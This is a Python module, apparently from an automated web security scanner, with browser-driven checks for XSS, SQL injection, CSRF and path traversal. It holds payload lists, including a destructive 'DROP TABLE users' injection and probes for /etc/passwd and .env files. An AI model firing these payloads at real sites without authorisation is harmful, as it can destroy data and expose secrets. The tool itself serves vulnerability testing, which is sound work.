"""Web-layer attack skills: XSS, SQL Injection, CSRF, Path Traversal.

Each class is decorated with ``@skill`` so it is automatically registered
in the global SkillRegistry when this module is imported.
"""

import json
import time
from typing import Any

from shared.schemas import ThreatLevel
from .base import BaseSkill, SkillResult, ReconData, TimelineEntry, skill, record, build_selector


# ===========================================================================
# XSS
# ===========================================================================


@skill
class XSSSkill(BaseSkill):
    """Reflected & DOM-based XSS via form inputs and URL fragments."""

    skill_name = "xss"
    skill_description = "Cross-Site Scripting — reflected & DOM-based via forms and URL fragments"
    default_severity = ThreatLevel.HIGH

    _PAYLOADS = [
        "<script>document.title='XSS_PROOF'</script>",
        "<img src=x onerror=\"document.title='XSS_PROOF'\">",
        "<svg onload=\"document.title='XSS_PROOF'\">",
        "javascript:void(document.title='XSS_PROOF')",
        "<body onload=\"document.title='XSS_PROOF'\">",
    ]

    async def execute(
        self, server: Any, target_url: str, recon: ReconData | None = None
    ) -> SkillResult:
        timeline: list[TimelineEntry] = []
        start = time.time()
        evidence: list[str] = []

        input_list = recon.inputs if recon else await _fetch_all_inputs(server)
        record(timeline, "recon", f"{len(input_list)} injectable elements")

        if not input_list:
            # DOM-based via URL fragment
            frag = f"{target_url}#<script>document.title='XSS_PROOF'</script>"
            await server.call_tool("browser_navigate", {"url": frag})
            title = await server.call_tool("browser_evaluate_js", {"script": "() => document.title"})
            if title.get("result") == "XSS_PROOF":
                evidence.append("DOM-based XSS via URL fragment")
                record(timeline, "success", "DOM XSS confirmed")

        for inp in input_list[:5]:
            sel = build_selector(inp)
            if not sel:
                continue

            for payload in self._PAYLOADS:
                record(timeline, "inject", f"{sel} ← XSS payload")
                await server.call_tool("browser_fill", {"selector": sel, "value": payload})
                try:
                    await server.call_tool("browser_submit_form", {"selector": "form"})
                except Exception:
                    pass
                await server.call_tool("browser_wait_for", {"delay_ms": 500})

                # Script-execution check
                title_res = await server.call_tool(
                    "browser_evaluate_js", {"script": "() => document.title"}
                )
                if title_res.get("result") == "XSS_PROOF":
                    evidence.append(f"Reflected XSS in {sel}: {payload}")
                    record(timeline, "success", f"XSS in {sel}")
                    break

                # Unescaped-reflection check
                html = (await server.call_tool("browser_get_html", {})).get("result", "")
                if payload.split(">")[0] + ">" in html:
                    evidence.append(f"Unescaped XSS payload in HTML via {sel}")
                    record(timeline, "success", f"Unescaped in {sel}")
                    break

            if evidence:
                break

        return SkillResult(
            skill_name=self.skill_name,
            success=bool(evidence),
            severity=self.default_severity,
            evidence=evidence,
            timeline=timeline,
            duration_ms=round((time.time() - start) * 1000, 2),
        )


# ===========================================================================
# SQL Injection
# ===========================================================================


@skill
class SQLInjectionSkill(BaseSkill):
    """Error-based and boolean-based SQL injection via form inputs."""

    skill_name = "sql_injection"
    skill_description = "SQL Injection — error-based & boolean-based via text/password inputs"
    default_severity = ThreatLevel.CRITICAL

    _PAYLOADS: list[tuple[str, str]] = [
        ("' OR '1'='1", "boolean_true"),
        ("' OR '1'='2", "boolean_false"),
        ("'; DROP TABLE users;--", "destructive"),
        ("' UNION SELECT NULL,NULL,NULL--", "union"),
        ("' OR 1=1--", "boolean_alt"),
    ]

    _ERROR_KEYWORDS = [
        "syntax error", "sql", "mysql", "ora-", "pg_", "sqlite",
        "unclosed quotation", "unexpected token",
    ]

    async def execute(
        self, server: Any, target_url: str, recon: ReconData | None = None
    ) -> SkillResult:
        timeline: list[TimelineEntry] = []
        start = time.time()
        evidence: list[str] = []

        input_list = _filter_text_inputs(recon.inputs if recon else await _fetch_all_inputs(server))
        record(timeline, "recon", f"{len(input_list)} text inputs for SQLi")

        for inp in input_list[:3]:
            sel = build_selector(inp)
            if not sel:
                continue

            true_html: str | None = None
            false_html: str | None = None

            for payload, label in self._PAYLOADS:
                record(timeline, "inject", f"SQLi [{label}] → {sel}")

                # Fresh page each attempt to avoid state bleed
                await server.call_tool("browser_navigate", {"url": target_url})
                await server.call_tool("browser_fill", {"selector": sel, "value": payload})

                # Fill password field with dummy if present
                has_pwd = await server.call_tool(
                    "browser_evaluate_js",
                    {"script": "() => document.querySelectorAll('input[type=password]').length"},
                )
                if int(has_pwd.get("result", 0)) > 0:
                    try:
                        await server.call_tool(
                            "browser_fill",
                            {"selector": "input[type=password]", "value": "x"},
                        )
                    except Exception:
                        pass

                try:
                    await server.call_tool("browser_submit_form", {"selector": "form"})
                except Exception:
                    pass
                await server.call_tool("browser_wait_for", {"delay_ms": 800})

                resp_html = (await server.call_tool("browser_get_html", {})).get("result", "")
                resp_text = (await server.call_tool("browser_get_text", {})).get("result", "")
                combined = (resp_text + resp_html).lower()

                # Error-based detection
                for kw in self._ERROR_KEYWORDS:
                    if kw in combined:
                        evidence.append(f"SQL error via {sel}: keyword='{kw}'")
                        record(timeline, "success", f"Error-based SQLi in {sel}")
                        break

                # Boolean-based detection
                if label == "boolean_true":
                    true_html = resp_html
                elif label == "boolean_false":
                    false_html = resp_html
                    if true_html and false_html and true_html != false_html:
                        evidence.append(f"Boolean-based SQLi in {sel}: true≠false responses")
                        record(timeline, "success", f"Boolean SQLi in {sel}")

                if len(evidence) >= 2:
                    break

            if evidence:
                break

        return SkillResult(
            skill_name=self.skill_name,
            success=bool(evidence),
            severity=self.default_severity,
            evidence=evidence,
            timeline=timeline,
            duration_ms=round((time.time() - start) * 1000, 2),
        )


# ===========================================================================
# CSRF
# ===========================================================================


@skill
class CSRFSkill(BaseSkill):
    """CSRF token-absence audit + SameSite cookie policy check."""

    skill_name = "csrf"
    skill_description = "CSRF — missing tokens on state-changing forms + weak SameSite policy"
    default_severity = ThreatLevel.HIGH

    async def execute(
        self, server: Any, target_url: str, recon: ReconData | None = None
    ) -> SkillResult:
        timeline: list[TimelineEntry] = []
        start = time.time()
        evidence: list[str] = []

        # --- Form enumeration ---
        forms_res = await server.call_tool(
            "browser_evaluate_js",
            {
                "script": (
                    "() => JSON.stringify([...document.querySelectorAll('form')].map((f,i) => ({"
                    "  index:i, action:f.action, method:f.method,"
                    "  hasCsrfToken:!![...f.elements].some(e =>"
                    "    /csrf|token|_token|xsrf/.test((e.name||'').toLowerCase())),"
                    "  inputCount:f.elements.length"
                    "})))"
                )
            },
        )
        forms = json.loads(forms_res.get("result", "[]"))
        record(timeline, "recon", f"{len(forms)} forms")

        for form in forms:
            if form.get("method", "get").upper() in ("POST", "PUT", "DELETE", "PATCH"):
                if not form.get("hasCsrfToken"):
                    evidence.append(
                        f"CSRF token missing on {form['method'].upper()} form "
                        f"(action={form.get('action', 'N/A')}, inputs={form.get('inputCount')})"
                    )
                    record(timeline, "success", f"Vulnerable form index={form['index']}")

        # --- SameSite cookie check ---
        cookies: list[dict[str, Any]] = (
            recon.cookies
            if recon
            else json.loads((await server.call_tool("browser_get_cookies", {})).get("result", "[]"))
        )
        for ck in cookies:
            name = (ck.get("name") or "").lower()
            if any(kw in name for kw in ("session", "auth", "token")):
                same_site = (ck.get("sameSite") or "").lower()
                if same_site in ("", "none"):
                    evidence.append(
                        f"Cookie '{ck.get('name')}' SameSite={same_site or 'unset'}"
                    )
                    record(timeline, "success", f"Weak SameSite: {ck.get('name')}")

        return SkillResult(
            skill_name=self.skill_name,
            success=bool(evidence),
            severity=self.default_severity,
            evidence=evidence,
            timeline=timeline,
            duration_ms=round((time.time() - start) * 1000, 2),
        )


# ===========================================================================
# Path Traversal
# ===========================================================================

_TRAVERSAL_PROBES = [
    "/../../../etc/passwd",
    "/..%2f..%2f..%2fetc%2fpasswd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/static/../../../etc/passwd",
    "/.env",
    "/config",
    "/admin",
    "/api/v1/../../../etc/passwd",
    "/__debug__",
    "/server-status",
    "/server-info",
]

_SENSITIVE_PATHS = {"/admin", "/__debug__", "/server-status", "/server-info"}


@skill
class PathTraversalSkill(BaseSkill):
    """Directory traversal + sensitive-endpoint exposure."""

    skill_name = "path_traversal"
    skill_description = "Path traversal via URL + sensitive endpoint discovery"
    default_severity = ThreatLevel.HIGH

    async def execute(
        self, server: Any, target_url: str, recon: ReconData | None = None
    ) -> SkillResult:
        timeline: list[TimelineEntry] = []
        start = time.time()
        evidence: list[str] = []
        base = target_url.rstrip("/")

        for path in _TRAVERSAL_PROBES:
            probe = base + path
            record(timeline, "probe", path)

            nav = await server.call_tool("browser_navigate", {"url": probe})
            if not nav.get("success"):
                continue
            await server.call_tool("browser_wait_for", {"delay_ms": 300})

            text = (await server.call_tool("browser_get_text", {})).get("result", "")

            # /etc/passwd leak
            if "root:" in text and "/bin" in text:
                evidence.append(f"/etc/passwd exposed via {path}")
                record(timeline, "success", "File read: /etc/passwd")
                break

            # .env exposure
            if path == "/.env" and any(
                kw in text.upper() for kw in ("SECRET", "API_KEY", "DATABASE_URL", "PASSWORD")
            ):
                evidence.append(f".env exposed at {probe}")
                record(timeline, "success", ".env exposed")

            # Sensitive endpoints without auth
            if path in _SENSITIVE_PATHS:
                if "404" not in text.lower() and "unauthorized" not in text.lower():
                    evidence.append(f"Sensitive endpoint without auth: {path}")
                    record(timeline, "success", f"Exposed: {path}")

        return SkillResult(
            skill_name=self.skill_name,
            success=bool(evidence),
            severity=self.default_severity,
            evidence=evidence,
            timeline=timeline,
            duration_ms=round((time.time() - start) * 1000, 2),
        )


# ===========================================================================
# Module-level helpers (shared by skills in this file)
# ===========================================================================


async def _fetch_all_inputs(server: Any) -> list[dict[str, str]]:
    """JS-extract all visible inputs/textareas from the page."""
    res = await server.call_tool(
        "browser_evaluate_js",
        {
            "script": (
                "() => JSON.stringify([...document.querySelectorAll("
                "  'input:not([type=hidden]), textarea, [contenteditable]')]"
                "  .map(el => ({tag:el.tagName, type:el.type, name:el.name, id:el.id})))"
            )
        },
    )
    return json.loads(res.get("result", "[]"))


def _filter_text_inputs(inputs: list[dict[str, str]]) -> list[dict[str, str]]:
    """Keep only text / password / untyped inputs."""
    return [i for i in inputs if i.get("type", "text") in ("text", "password", "")]
